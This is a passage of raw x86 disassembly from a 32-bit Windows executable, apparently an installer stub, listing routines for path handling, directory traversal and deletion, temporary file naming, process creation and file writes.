  4057b1:	ff 15 7c 82 40 00    	call   *0x40827c
  4057b7:	ff 15 bc 81 40 00    	call   *0x4081bc
  4057bd:	56                   	push   %esi
  4057be:	6a 42                	push   $0x42
  4057c0:	ff 15 28 81 40 00    	call   *0x408128
  4057c6:	50                   	push   %eax
  4057c7:	89 45 08             	mov    %eax,0x8(%ebp)
  4057ca:	ff 15 a0 80 40 00    	call   *0x4080a0
  4057d0:	8b f0                	mov    %eax,%esi
  4057d2:	8d 45 c4             	lea    -0x3c(%ebp),%eax
  4057d5:	89 75 d8             	mov    %esi,-0x28(%ebp)
  4057d8:	50                   	push   %eax
  4057d9:	53                   	push   %ebx
  4057da:	57                   	push   %edi
  4057db:	ff 75 fc             	push   -0x4(%ebp)
  4057de:	ff 15 60 82 40 00    	call   *0x408260
  4057e4:	03 f0                	add    %eax,%esi
  4057e6:	c6 06 0d             	movb   $0xd,(%esi)
  4057e9:	46                   	inc    %esi
  4057ea:	c6 06 0a             	movb   $0xa,(%esi)
  4057ed:	46                   	inc    %esi
  4057ee:	43                   	inc    %ebx
  4057ef:	3b 5d 10             	cmp    0x10(%ebp),%ebx
  4057f2:	7c de                	jl     0x4057d2
  4057f4:	ff 75 08             	push   0x8(%ebp)
  4057f7:	ff 15 a4 80 40 00    	call   *0x4080a4
  4057fd:	ff 75 08             	push   0x8(%ebp)
  405800:	6a 01                	push   $0x1
  405802:	ff 15 88 81 40 00    	call   *0x408188
  405808:	ff 15 78 82 40 00    	call   *0x408278
  40580e:	33 c0                	xor    %eax,%eax
  405810:	e9 ae fe ff ff       	jmp    0x4056c3
  405815:	55                   	push   %ebp
  405816:	8b ec                	mov    %esp,%ebp
  405818:	83 ec 20             	sub    $0x20,%esp
  40581b:	b8 84 83 40 00       	mov    $0x408384,%eax
  405820:	80 65 e1 00          	andb   $0x0,-0x1f(%ebp)
  405824:	89 45 e4             	mov    %eax,-0x1c(%ebp)
  405827:	89 45 e8             	mov    %eax,-0x18(%ebp)
  40582a:	8d 45 e0             	lea    -0x20(%ebp),%eax
  40582d:	83 65 ec 00          	andl   $0x0,-0x14(%ebp)
  405831:	83 65 fc 00          	andl   $0x0,-0x4(%ebp)
  405835:	89 45 f8             	mov    %eax,-0x8(%ebp)
  405838:	8d 45 f4             	lea    -0xc(%ebp),%eax
  40583b:	56                   	push   %esi
  40583c:	50                   	push   %eax
  40583d:	c6 45 e0 01          	movb   $0x1,-0x20(%ebp)
  405841:	ff 75 08             	push   0x8(%ebp)
  405844:	66 c7 45 e2 04 00    	movw   $0x4,-0x1e(%ebp)
  40584a:	c7 45 f0 74 83 40 00 	movl   $0x408374,-0x10(%ebp)
  405851:	c7 45 f4 0c 00 00 00 	movl   $0xc,-0xc(%ebp)
  405858:	ff 15 94 80 40 00    	call   *0x408094
  40585e:	85 c0                	test   %eax,%eax
  405860:	74 04                	je     0x405866
  405862:	33 c0                	xor    %eax,%eax
  405864:	eb 27                	jmp    0x40588d
  405866:	8b 35 98 80 40 00    	mov    0x408098,%esi
  40586c:	ff d6                	call   *%esi
  40586e:	3d b7 00 00 00       	cmp    $0xb7,%eax
  405873:	75 18                	jne    0x40588d
  405875:	8d 45 e0             	lea    -0x20(%ebp),%eax
  405878:	50                   	push   %eax
  405879:	68 07 00 00 80       	push   $0x80000007
  40587e:	ff 75 08             	push   0x8(%ebp)
  405881:	ff 15 28 80 40 00    	call   *0x408028
  405887:	85 c0                	test   %eax,%eax
  405889:	75 d7                	jne    0x405862
  40588b:	ff d6                	call   *%esi
  40588d:	5e                   	pop    %esi
  40588e:	c9                   	leave
  40588f:	c2 04 00             	ret    $0x4
  405892:	6a 00                	push   $0x0
  405894:	ff 74 24 08          	push   0x8(%esp)
  405898:	ff 15 94 80 40 00    	call   *0x408094
  40589e:	85 c0                	test   %eax,%eax
  4058a0:	74 04                	je     0x4058a6
  4058a2:	33 c0                	xor    %eax,%eax
  4058a4:	eb 06                	jmp    0x4058ac
  4058a6:	ff 15 98 80 40 00    	call   *0x408098
  4058ac:	c2 04 00             	ret    $0x4
  4058af:	6a 06                	push   $0x6
  4058b1:	e8 7b 0d 00 00       	call   0x406631
  4058b6:	85 c0                	test   %eax,%eax
  4058b8:	74 0a                	je     0x4058c4
  4058ba:	ff d0                	call   *%eax
  4058bc:	85 c0                	test   %eax,%eax
  4058be:	74 04                	je     0x4058c4
  4058c0:	33 c0                	xor    %eax,%eax
  4058c2:	40                   	inc    %eax
  4058c3:	c3                   	ret
  4058c4:	33 c0                	xor    %eax,%eax
  4058c6:	c3                   	ret
  4058c7:	55                   	push   %ebp
  4058c8:	8b ec                	mov    %esp,%ebp
  4058ca:	83 ec 10             	sub    $0x10,%esp
  4058cd:	8d 45 f0             	lea    -0x10(%ebp),%eax
  4058d0:	c7 05 58 25 42 00 44 	movl   $0x44,0x422558
  4058d7:	00 00 00 
  4058da:	50                   	push   %eax
  4058db:	33 c0                	xor    %eax,%eax
  4058dd:	68 58 25 42 00       	push   $0x422558
  4058e2:	50                   	push   %eax
  4058e3:	50                   	push   %eax
  4058e4:	68 00 00 00 04       	push   $0x4000000
  4058e9:	50                   	push   %eax
  4058ea:	50                   	push   %eax
  4058eb:	50                   	push   %eax
  4058ec:	ff 75 08             	push   0x8(%ebp)
  4058ef:	50                   	push   %eax
  4058f0:	ff 15 9c 80 40 00    	call   *0x40809c
  4058f6:	85 c0                	test   %eax,%eax
  4058f8:	74 0c                	je     0x405906
  4058fa:	ff 75 f4             	push   -0xc(%ebp)
  4058fd:	ff 15 20 81 40 00    	call   *0x408120
  405903:	8b 45 f0             	mov    -0x10(%ebp),%eax
  405906:	c9                   	leave
  405907:	c2 04 00             	ret    $0x4
  40590a:	8b 44 24 04          	mov    0x4(%esp),%eax
  40590e:	50                   	push   %eax
  40590f:	83 60 24 00          	andl   $0x0,0x24(%eax)
  405913:	c7 00 3c 00 00 00    	movl   $0x3c,(%eax)
  405919:	ff 15 78 81 40 00    	call   *0x408178
  40591f:	c2 04 00             	ret    $0x4
  405922:	ff 25 a4 81 40 00    	jmp    *0x4081a4
  405928:	68 00 04 00 00       	push   $0x400
  40592d:	ff 74 24 0c          	push   0xc(%esp)
  405931:	ff 74 24 0c          	push   0xc(%esp)
  405935:	ff 35 18 3f 42 00    	push   0x423f18
  40593b:	ff 15 a0 81 40 00    	call   *0x4081a0
  405941:	c2 08 00             	ret    $0x8
  405944:	8b 44 24 08          	mov    0x8(%esp),%eax
  405948:	8b c8                	mov    %eax,%ecx
  40594a:	81 e1 ff ff 1f 00    	and    $0x1fffff,%ecx
  405950:	83 3d 00 48 42 00 00 	cmpl   $0x0,0x424800
  405957:	74 05                	je     0x40595e
  405959:	c1 e8 15             	shr    $0x15,%eax
  40595c:	75 47                	jne    0x4059a5
  40595e:	83 3d 08 48 42 00 00 	cmpl   $0x0,0x424808
  405965:	74 06                	je     0x40596d
  405967:	81 f1 00 00 18 00    	xor    $0x180000,%ecx
  40596d:	a1 48 47 42 00       	mov    0x424748,%eax
  405972:	68 30 a2 40 00       	push   $0x40a230
  405977:	a3 34 a2 40 00       	mov    %eax,0x40a234
  40597c:	a1 40 47 42 00       	mov    0x424740,%eax
  405981:	a3 38 a2 40 00       	mov    %eax,0x40a238
  405986:	8b 44 24 08          	mov    0x8(%esp),%eax
  40598a:	a3 3c a2 40 00       	mov    %eax,0x40a23c
  40598f:	c7 05 40 a2 40 00 40 	movl   $0x423f40,0x40a240
  405996:	3f 42 00 
  405999:	89 0d 44 a2 40 00    	mov    %ecx,0x40a244
  40599f:	ff 15 9c 81 40 00    	call   *0x40819c
  4059a5:	c2 08 00             	ret    $0x8
  4059a8:	56                   	push   %esi
  4059a9:	8b 74 24 08          	mov    0x8(%esp),%esi
  4059ad:	57                   	push   %edi
  4059ae:	56                   	push   %esi
  4059af:	e8 e8 03 00 00       	call   0x405d9c
  4059b4:	8b f8                	mov    %eax,%edi
  4059b6:	83 ff ff             	cmp    $0xffffffff,%edi
  4059b9:	74 2e                	je     0x4059e9
  4059bb:	f6 44 24 10 01       	testb  $0x1,0x10(%esp)
  4059c0:	56                   	push   %esi
  4059c1:	74 08                	je     0x4059cb
  4059c3:	ff 15 8c 80 40 00    	call   *0x40808c
  4059c9:	eb 06                	jmp    0x4059d1
  4059cb:	ff 15 60 81 40 00    	call   *0x408160
  4059d1:	85 c0                	test   %eax,%eax
  4059d3:	74 05                	je     0x4059da
  4059d5:	33 c0                	xor    %eax,%eax
  4059d7:	40                   	inc    %eax
  4059d8:	eb 11                	jmp    0x4059eb
  4059da:	f6 44 24 10 04       	testb  $0x4,0x10(%esp)
  4059df:	75 08                	jne    0x4059e9
  4059e1:	57                   	push   %edi
  4059e2:	56                   	push   %esi
  4059e3:	ff 15 fc 80 40 00    	call   *0x4080fc
  4059e9:	33 c0                	xor    %eax,%eax
  4059eb:	5f                   	pop    %edi
  4059ec:	5e                   	pop    %esi
  4059ed:	c2 08 00             	ret    $0x8
  4059f0:	55                   	push   %ebp
  4059f1:	8b ec                	mov    %esp,%ebp
  4059f3:	81 ec 4c 01 00 00    	sub    $0x14c,%esp
  4059f9:	53                   	push   %ebx
  4059fa:	8b 5d 0c             	mov    0xc(%ebp),%ebx
  4059fd:	56                   	push   %esi
  4059fe:	57                   	push   %edi
  4059ff:	8b 7d 08             	mov    0x8(%ebp),%edi
  405a02:	8b c3                	mov    %ebx,%eax
  405a04:	83 e0 04             	and    $0x4,%eax
  405a07:	57                   	push   %edi
  405a08:	89 45 fc             	mov    %eax,-0x4(%ebp)
  405a0b:	e8 9e 02 00 00       	call   0x405cae
  405a10:	f6 c3 08             	test   $0x8,%bl
  405a13:	89 45 f4             	mov    %eax,-0xc(%ebp)
  405a16:	74 17                	je     0x405a2f
  405a18:	57                   	push   %edi
  405a19:	ff 15 60 81 40 00    	call   *0x408160
  405a1f:	f7 d8                	neg    %eax
  405a21:	1b c0                	sbb    %eax,%eax
  405a23:	40                   	inc    %eax
  405a24:	01 05 e8 47 42 00    	add    %eax,0x4247e8
  405a2a:	e9 8a 01 00 00       	jmp    0x405bb9
  405a2f:	89 5d 08             	mov    %ebx,0x8(%ebp)
  405a32:	83 65 08 01          	andl   $0x1,0x8(%ebp)
  405a36:	74 11                	je     0x405a49
  405a38:	85 c0                	test   %eax,%eax
  405a3a:	0f 84 27 01 00 00    	je     0x405b67
  405a40:	f6 c3 02             	test   $0x2,%bl
  405a43:	0f 84 1e 01 00 00    	je     0x405b67
  405a49:	be 58 1d 42 00       	mov    $0x421d58,%esi
  405a4e:	57                   	push   %edi
  405a4f:	56                   	push   %esi
  405a50:	e8 d3 07 00 00       	call   0x406228
  405a55:	83 7d 08 00          	cmpl   $0x0,0x8(%ebp)
  405a59:	74 0d                	je     0x405a68
  405a5b:	68 e4 a3 40 00       	push   $0x40a3e4
  405a60:	56                   	push   %esi
  405a61:	e8 de 07 00 00       	call   0x406244
  405a66:	eb 06                	jmp    0x405a6e
  405a68:	57                   	push   %edi
  405a69:	e8 99 01 00 00       	call   0x405c07
  405a6e:	80 3f 00             	cmpb   $0x0,(%edi)
  405a71:	75 09                	jne    0x405a7c
  405a73:	80 3d 58 1d 42 00 5c 	cmpb   $0x5c,0x421d58
  405a7a:	75 0b                	jne    0x405a87
  405a7c:	68 14 a0 40 00       	push   $0x40a014
  405a81:	57                   	push   %edi
  405a82:	e8 bd 07 00 00       	call   0x406244
  405a87:	57                   	push   %edi
  405a88:	e8 b1 07 00 00       	call   0x40623e
  405a8d:	8b d8                	mov    %eax,%ebx
  405a8f:	8d 85 b4 fe ff ff    	lea    -0x14c(%ebp),%eax
  405a95:	50                   	push   %eax
  405a96:	56                   	push   %esi
  405a97:	03 df                	add    %edi,%ebx
  405a99:	ff 15 5c 81 40 00    	call   *0x40815c
  405a9f:	83 f8 ff             	cmp    $0xffffffff,%eax
  405aa2:	89 45 f8             	mov    %eax,-0x8(%ebp)
  405aa5:	0f 84 b2 00 00 00    	je     0x405b5d
  405aab:	8d 85 e0 fe ff ff    	lea    -0x120(%ebp),%eax
  405ab1:	6a 3f                	push   $0x3f
  405ab3:	50                   	push   %eax
  405ab4:	8d b5 e0 fe ff ff    	lea    -0x120(%ebp),%esi
  405aba:	e8 2c 01 00 00       	call   0x405beb
  405abf:	80 38 00             	cmpb   $0x0,(%eax)
  405ac2:	74 09                	je     0x405acd
  405ac4:	80 7d e4 00          	cmpb   $0x0,-0x1c(%ebp)
  405ac8:	74 03                	je     0x405acd
  405aca:	8d 75 e4             	lea    -0x1c(%ebp),%esi
  405acd:	80 3e 2e             	cmpb   $0x2e,(%esi)
  405ad0:	75 11                	jne    0x405ae3
  405ad2:	8a 46 01             	mov    0x1(%esi),%al
  405ad5:	84 c0                	test   %al,%al
  405ad7:	74 63                	je     0x405b3c
  405ad9:	3c 2e                	cmp    $0x2e,%al
  405adb:	75 06                	jne    0x405ae3
  405add:	80 7e 02 00          	cmpb   $0x0,0x2(%esi)
  405ae1:	74 59                	je     0x405b3c
  405ae3:	56                   	push   %esi
  405ae4:	53                   	push   %ebx
  405ae5:	e8 3e 07 00 00       	call   0x406228
  405aea:	f6 85 b4 fe ff ff 10 	testb  $0x10,-0x14c(%ebp)
  405af1:	74 15                	je     0x405b08
  405af3:	8b 45 0c             	mov    0xc(%ebp),%eax
  405af6:	83 e0 03             	and    $0x3,%eax
  405af9:	3c 03                	cmp    $0x3,%al
  405afb:	75 3f                	jne    0x405b3c
  405afd:	ff 75 0c             	push   0xc(%ebp)
  405b00:	57                   	push   %edi
  405b01:	e8 ea fe ff ff       	call   0x4059f0
  405b06:	eb 34                	jmp    0x405b3c
  405b08:	ff 75 fc             	push   -0x4(%ebp)
  405b0b:	57                   	push   %edi
  405b0c:	e8 97 fe ff ff       	call   0x4059a8
  405b11:	85 c0                	test   %eax,%eax
  405b13:	75 1f                	jne    0x405b34
  405b15:	39 45 fc             	cmp    %eax,-0x4(%ebp)
  405b18:	74 12                	je     0x405b2c
  405b1a:	57                   	push   %edi
  405b1b:	6a f1                	push   $0xfffffff1
  405b1d:	e8 2d f8 ff ff       	call   0x40534f
  405b22:	6a 00                	push   $0x0
  405b24:	57                   	push   %edi
  405b25:	e8 dd 04 00 00       	call   0x406007
  405b2a:	eb 10                	jmp    0x405b3c
  405b2c:	ff 05 e8 47 42 00    	incl   0x4247e8
  405b32:	eb 08                	jmp    0x405b3c
  405b34:	57                   	push   %edi
  405b35:	6a f2                	push   $0xfffffff2
  405b37:	e8 13 f8 ff ff       	call   0x40534f
  405b3c:	8d 85 b4 fe ff ff    	lea    -0x14c(%ebp),%eax
  405b42:	50                   	push   %eax
  405b43:	ff 75 f8             	push   -0x8(%ebp)
  405b46:	ff 15 58 81 40 00    	call   *0x408158
  405b4c:	85 c0                	test   %eax,%eax
  405b4e:	0f 85 57 ff ff ff    	jne    0x405aab
  405b54:	ff 75 f8             	push   -0x8(%ebp)
  405b57:	ff 15 40 81 40 00    	call   *0x408140
  405b5d:	83 7d 08 00          	cmpl   $0x0,0x8(%ebp)
  405b61:	74 04                	je     0x405b67
  405b63:	80 63 ff 00          	andb   $0x0,-0x1(%ebx)
  405b67:	33 f6                	xor    %esi,%esi
  405b69:	39 75 08             	cmp    %esi,0x8(%ebp)
  405b6c:	74 4b                	je     0x405bb9
  405b6e:	39 75 f4             	cmp    %esi,-0xc(%ebp)
  405b71:	75 08                	jne    0x405b7b
  405b73:	ff 05 e8 47 42 00    	incl   0x4247e8
  405b79:	eb 3e                	jmp    0x405bb9
  405b7b:	57                   	push   %edi
  405b7c:	e8 1b 0a 00 00       	call   0x40659c
  405b81:	85 c0                	test   %eax,%eax
  405b83:	74 34                	je     0x405bb9
  405b85:	57                   	push   %edi
  405b86:	e8 35 00 00 00       	call   0x405bc0
  405b8b:	8b 45 fc             	mov    -0x4(%ebp),%eax
  405b8e:	0c 01                	or     $0x1,%al
  405b90:	50                   	push   %eax
  405b91:	57                   	push   %edi
  405b92:	e8 11 fe ff ff       	call   0x4059a8
  405b97:	85 c0                	test   %eax,%eax
  405b99:	75 16                	jne    0x405bb1
  405b9b:	39 75 fc             	cmp    %esi,-0x4(%ebp)
  405b9e:	74 d3                	je     0x405b73
  405ba0:	57                   	push   %edi
  405ba1:	6a f1                	push   $0xfffffff1
  405ba3:	e8 a7 f7 ff ff       	call   0x40534f
  405ba8:	56                   	push   %esi
  405ba9:	57                   	push   %edi
  405baa:	e8 58 04 00 00       	call   0x406007
  405baf:	eb 08                	jmp    0x405bb9
  405bb1:	57                   	push   %edi
  405bb2:	6a e5                	push   $0xffffffe5
  405bb4:	e8 96 f7 ff ff       	call   0x40534f
  405bb9:	5f                   	pop    %edi
  405bba:	5e                   	pop    %esi
  405bbb:	5b                   	pop    %ebx
  405bbc:	c9                   	leave
  405bbd:	c2 08 00             	ret    $0x8
  405bc0:	56                   	push   %esi
  405bc1:	8b 74 24 08          	mov    0x8(%esp),%esi
  405bc5:	56                   	push   %esi
  405bc6:	e8 73 06 00 00       	call   0x40623e
  405bcb:	03 c6                	add    %esi,%eax
  405bcd:	50                   	push   %eax
  405bce:	56                   	push   %esi
  405bcf:	ff 15 8c 81 40 00    	call   *0x40818c
  405bd5:	80 38 5c             	cmpb   $0x5c,(%eax)
  405bd8:	74 0b                	je     0x405be5
  405bda:	68 14 a0 40 00       	push   $0x40a014
  405bdf:	56                   	push   %esi
  405be0:	e8 5f 06 00 00       	call   0x406244
  405be5:	8b c6                	mov    %esi,%eax
  405be7:	5e                   	pop    %esi
  405be8:	c2 04 00             	ret    $0x4
  405beb:	8b 44 24 04          	mov    0x4(%esp),%eax
  405bef:	eb 0d                	jmp    0x405bfe
  405bf1:	3a 4c 24 08          	cmp    0x8(%esp),%cl
  405bf5:	74 0d                	je     0x405c04
  405bf7:	50                   	push   %eax
  405bf8:	ff 15 10 82 40 00    	call   *0x408210
  405bfe:	8a 08                	mov    (%eax),%cl
  405c00:	84 c9                	test   %cl,%cl
  405c02:	75 ed                	jne    0x405bf1
  405c04:	c2 08 00             	ret    $0x8
  405c07:	56                   	push   %esi
  405c08:	8b 74 24 08          	mov    0x8(%esp),%esi
  405c0c:	56                   	push   %esi
  405c0d:	e8 2c 06 00 00       	call   0x40623e
  405c12:	03 c6                	add    %esi,%eax
  405c14:	80 38 5c             	cmpb   $0x5c,(%eax)
  405c17:	74 0c                	je     0x405c25
  405c19:	50                   	push   %eax
  405c1a:	56                   	push   %esi
  405c1b:	ff 15 8c 81 40 00    	call   *0x40818c
  405c21:	3b c6                	cmp    %esi,%eax
  405c23:	77 ef                	ja     0x405c14
  405c25:	80 20 00             	andb   $0x0,(%eax)
  405c28:	40                   	inc    %eax
  405c29:	5e                   	pop    %esi
  405c2a:	c2 04 00             	ret    $0x4
  405c2d:	8b 54 24 04          	mov    0x4(%esp),%edx
  405c31:	8a 0a                	mov    (%edx),%cl
  405c33:	8a c1                	mov    %cl,%al
  405c35:	0c 20                	or     $0x20,%al
  405c37:	80 f9 5c             	cmp    $0x5c,%cl
  405c3a:	75 05                	jne    0x405c41
  405c3c:	38 4a 01             	cmp    %cl,0x1(%edx)
  405c3f:	74 0e                	je     0x405c4f
  405c41:	3c 61                	cmp    $0x61,%al
  405c43:	7c 0f                	jl     0x405c54
  405c45:	3c 7a                	cmp    $0x7a,%al
  405c47:	7f 0b                	jg     0x405c54
  405c49:	80 7a 01 3a          	cmpb   $0x3a,0x1(%edx)
  405c4d:	75 05                	jne    0x405c54
  405c4f:	33 c0                	xor    %eax,%eax
  405c51:	40                   	inc    %eax
  405c52:	eb 02                	jmp    0x405c56
  405c54:	33 c0                	xor    %eax,%eax
  405c56:	c2 04 00             	ret    $0x4
  405c59:	53                   	push   %ebx
  405c5a:	56                   	push   %esi
  405c5b:	8b 35 10 82 40 00    	mov    0x408210,%esi
  405c61:	57                   	push   %edi
  405c62:	8b 7c 24 10          	mov    0x10(%esp),%edi
  405c66:	57                   	push   %edi
  405c67:	ff d6                	call   *%esi
  405c69:	8b d8                	mov    %eax,%ebx
  405c6b:	53                   	push   %ebx
  405c6c:	ff d6                	call   *%esi
  405c6e:	8a 0f                	mov    (%edi),%cl
  405c70:	84 c9                	test   %cl,%cl
  405c72:	74 10                	je     0x405c84
  405c74:	80 3b 3a             	cmpb   $0x3a,(%ebx)
  405c77:	75 0b                	jne    0x405c84
  405c79:	80 7b 01 5c          	cmpb   $0x5c,0x1(%ebx)
  405c7d:	75 05                	jne    0x405c84
  405c7f:	50                   	push   %eax
  405c80:	ff d6                	call   *%esi
  405c82:	eb 24                	jmp    0x405ca8
  405c84:	80 f9 5c             	cmp    $0x5c,%cl
  405c87:	75 1d                	jne    0x405ca6
  405c89:	38 4f 01             	cmp    %cl,0x1(%edi)
  405c8c:	75 18                	jne    0x405ca6
  405c8e:	6a 02                	push   $0x2
  405c90:	5e                   	pop    %esi
  405c91:	6a 5c                	push   $0x5c
  405c93:	50                   	push   %eax
  405c94:	4e                   	dec    %esi
  405c95:	e8 51 ff ff ff       	call   0x405beb
  405c9a:	80 38 00             	cmpb   $0x0,(%eax)
  405c9d:	74 07                	je     0x405ca6
  405c9f:	40                   	inc    %eax
  405ca0:	85 f6                	test   %esi,%esi
  405ca2:	75 ed                	jne    0x405c91
  405ca4:	eb 02                	jmp    0x405ca8
  405ca6:	33 c0                	xor    %eax,%eax
  405ca8:	5f                   	pop    %edi
  405ca9:	5e                   	pop    %esi
  405caa:	5b                   	pop    %ebx
  405cab:	c2 04 00             	ret    $0x4
  405cae:	56                   	push   %esi
  405caf:	57                   	push   %edi
  405cb0:	ff 74 24 0c          	push   0xc(%esp)
  405cb4:	be 58 21 42 00       	mov    $0x422158,%esi
  405cb9:	56                   	push   %esi
  405cba:	e8 69 05 00 00       	call   0x406228
  405cbf:	56                   	push   %esi
  405cc0:	e8 94 ff ff ff       	call   0x405c59
  405cc5:	8b f8                	mov    %eax,%edi
  405cc7:	85 ff                	test   %edi,%edi
  405cc9:	75 04                	jne    0x405ccf
  405ccb:	33 c0                	xor    %eax,%eax
  405ccd:	eb 52                	jmp    0x405d21
  405ccf:	57                   	push   %edi
  405cd0:	e8 2e 08 00 00       	call   0x406503
  405cd5:	f6 05 5c 47 42 00 80 	testb  $0x80,0x42475c
  405cdc:	74 0a                	je     0x405ce8
  405cde:	8a 07                	mov    (%edi),%al
  405ce0:	84 c0                	test   %al,%al
  405ce2:	74 e7                	je     0x405ccb
  405ce4:	3c 5c                	cmp    $0x5c,%al
  405ce6:	74 e3                	je     0x405ccb
  405ce8:	2b fe                	sub    %esi,%edi
  405cea:	eb 14                	jmp    0x405d00
  405cec:	e8 ab 08 00 00       	call   0x40659c
  405cf1:	85 c0                	test   %eax,%eax
  405cf3:	74 05                	je     0x405cfa
  405cf5:	f6 00 10             	testb  $0x10,(%eax)
  405cf8:	74 d1                	je     0x405ccb
  405cfa:	56                   	push   %esi
  405cfb:	e8 07 ff ff ff       	call   0x405c07
  405d00:	56                   	push   %esi
  405d01:	e8 38 05 00 00       	call   0x40623e
  405d06:	3b c7                	cmp    %edi,%eax
  405d08:	56                   	push   %esi
  405d09:	7f e1                	jg     0x405cec
  405d0b:	e8 b0 fe ff ff       	call   0x405bc0
  405d10:	56                   	push   %esi
  405d11:	ff 15 f4 80 40 00    	call   *0x4080f4
  405d17:	33 c9                	xor    %ecx,%ecx
  405d19:	83 f8 ff             	cmp    $0xffffffff,%eax
  405d1c:	0f 95 c1             	setne  %cl
  405d1f:	8b c1                	mov    %ecx,%eax
  405d21:	5f                   	pop    %edi
  405d22:	5e                   	pop    %esi
  405d23:	c2 04 00             	ret    $0x4
  405d26:	55                   	push   %ebp
  405d27:	8b ec                	mov    %esp,%ebp
  405d29:	51                   	push   %ecx
  405d2a:	53                   	push   %ebx
  405d2b:	56                   	push   %esi
  405d2c:	57                   	push   %edi
  405d2d:	8b 3d b8 80 40 00    	mov    0x4080b8,%edi
  405d33:	ff 75 0c             	push   0xc(%ebp)
  405d36:	ff d7                	call   *%edi
  405d38:	8b 75 08             	mov    0x8(%ebp),%esi
  405d3b:	89 45 fc             	mov    %eax,-0x4(%ebp)
  405d3e:	eb 27                	jmp    0x405d67
  405d40:	8b 45 fc             	mov    -0x4(%ebp),%eax
  405d43:	ff 75 0c             	push   0xc(%ebp)
  405d46:	8a 1c 30             	mov    (%eax,%esi,1),%bl
  405d49:	80 24 30 00          	andb   $0x0,(%eax,%esi,1)
  405d4d:	56                   	push   %esi
  405d4e:	ff 15 18 81 40 00    	call   *0x408118
  405d54:	85 c0                	test   %eax,%eax
  405d56:	8b 45 fc             	mov    -0x4(%ebp),%eax
  405d59:	88 1c 30             	mov    %bl,(%eax,%esi,1)
  405d5c:	74 1a                	je     0x405d78
  405d5e:	56                   	push   %esi
  405d5f:	ff 15 10 82 40 00    	call   *0x408210
  405d65:	8b f0                	mov    %eax,%esi
  405d67:	56                   	push   %esi
  405d68:	ff d7                	call   *%edi
  405d6a:	3b 45 fc             	cmp    -0x4(%ebp),%eax
  405d6d:	7d d1                	jge    0x405d40
  405d6f:	33 c0                	xor    %eax,%eax
  405d71:	5f                   	pop    %edi
  405d72:	5e                   	pop    %esi
  405d73:	5b                   	pop    %ebx
  405d74:	c9                   	leave
  405d75:	c2 08 00             	ret    $0x8
  405d78:	8b c6                	mov    %esi,%eax
  405d7a:	eb f5                	jmp    0x405d71
  405d7c:	8b 4c 24 04          	mov    0x4(%esp),%ecx
  405d80:	56                   	push   %esi
  405d81:	8b 74 24 10          	mov    0x10(%esp),%esi
  405d85:	85 f6                	test   %esi,%esi
  405d87:	76 0f                	jbe    0x405d98
  405d89:	8b 44 24 0c          	mov    0xc(%esp),%eax
  405d8d:	2b c1                	sub    %ecx,%eax
  405d8f:	8a 14 08             	mov    (%eax,%ecx,1),%dl
  405d92:	88 11                	mov    %dl,(%ecx)
  405d94:	41                   	inc    %ecx
  405d95:	4e                   	dec    %esi
  405d96:	75 f7                	jne    0x405d8f
  405d98:	5e                   	pop    %esi
  405d99:	c2 0c 00             	ret    $0xc
  405d9c:	56                   	push   %esi
  405d9d:	ff 74 24 08          	push   0x8(%esp)
  405da1:	ff 15 f4 80 40 00    	call   *0x4080f4
  405da7:	8b f0                	mov    %eax,%esi
  405da9:	83 fe ff             	cmp    $0xffffffff,%esi
  405dac:	74 0d                	je     0x405dbb
  405dae:	24 fe                	and    $0xfe,%al
  405db0:	50                   	push   %eax
  405db1:	ff 74 24 0c          	push   0xc(%esp)
  405db5:	ff 15 fc 80 40 00    	call   *0x4080fc
  405dbb:	8b c6                	mov    %esi,%eax
  405dbd:	5e                   	pop    %esi
  405dbe:	c2 04 00             	ret    $0x4
  405dc1:	ff 74 24 04          	push   0x4(%esp)
  405dc5:	ff 15 f4 80 40 00    	call   *0x4080f4
  405dcb:	8b c8                	mov    %eax,%ecx
  405dcd:	6a 00                	push   $0x0
  405dcf:	41                   	inc    %ecx
  405dd0:	f7 d9                	neg    %ecx
  405dd2:	1b c9                	sbb    %ecx,%ecx
  405dd4:	23 c8                	and    %eax,%ecx
  405dd6:	51                   	push   %ecx
  405dd7:	ff 74 24 14          	push   0x14(%esp)
  405ddb:	6a 00                	push   $0x0
  405ddd:	6a 01                	push   $0x1
  405ddf:	ff 74 24 1c          	push   0x1c(%esp)
  405de3:	ff 74 24 1c          	push   0x1c(%esp)
  405de7:	ff 15 f0 80 40 00    	call   *0x4080f0
  405ded:	c2 0c 00             	ret    $0xc
  405df0:	55                   	push   %ebp
  405df1:	8b ec                	mov    %esp,%ebp
  405df3:	56                   	push   %esi
  405df4:	8b 75 08             	mov    0x8(%ebp),%esi
  405df7:	57                   	push   %edi
  405df8:	6a 64                	push   $0x64
  405dfa:	5f                   	pop    %edi
  405dfb:	a1 ec a3 40 00       	mov    0x40a3ec,%eax
  405e00:	4f                   	dec    %edi
  405e01:	89 45 08             	mov    %eax,0x8(%ebp)
  405e04:	ff 15 e8 80 40 00    	call   *0x4080e8
  405e0a:	6a 1a                	push   $0x1a
  405e0c:	33 d2                	xor    %edx,%edx
  405e0e:	59                   	pop    %ecx
  405e0f:	f7 f1                	div    %ecx
  405e11:	56                   	push   %esi
  405e12:	8d 45 08             	lea    0x8(%ebp),%eax
  405e15:	6a 00                	push   $0x0
  405e17:	50                   	push   %eax
  405e18:	ff 75 0c             	push   0xc(%ebp)
  405e1b:	00 55 0a             	add    %dl,0xa(%ebp)
  405e1e:	ff 15 88 80 40 00    	call   *0x408088
  405e24:	85 c0                	test   %eax,%eax
  405e26:	75 0d                	jne    0x405e35
  405e28:	85 ff                	test   %edi,%edi
  405e2a:	75 cf                	jne    0x405dfb
  405e2c:	80 26 00             	andb   $0x0,(%esi)
  405e2f:	5f                   	pop    %edi
  405e30:	5e                   	pop    %esi
  405e31:	5d                   	pop    %ebp
  405e32:	c2 08 00             	ret    $0x8
  405e35:	8b c6                	mov    %esi,%eax
  405e37:	eb f6                	jmp    0x405e2f
  405e39:	55                   	push   %ebp
  405e3a:	8b ec                	mov    %esp,%ebp
  405e3c:	56                   	push   %esi
  405e3d:	8b 75 10             	mov    0x10(%ebp),%esi
  405e40:	8d 45 10             	lea    0x10(%ebp),%eax
  405e43:	6a 00                	push   $0x0
  405e45:	50                   	push   %eax
  405e46:	56                   	push   %esi
  405e47:	ff 75 0c             	push   0xc(%ebp)
  405e4a:	ff 75 08             	push   0x8(%ebp)
  405e4d:	ff 15 e4 80 40 00    	call   *0x4080e4
  405e53:	85 c0                	test   %eax,%eax
  405e55:	74 0a                	je     0x405e61
  405e57:	3b 75 10             	cmp    0x10(%ebp),%esi
  405e5a:	75 05                	jne    0x405e61
  405e5c:	33 c0                	xor    %eax,%eax
  405e5e:	40                   	inc    %eax
  405e5f:	eb 02                	jmp    0x405e63
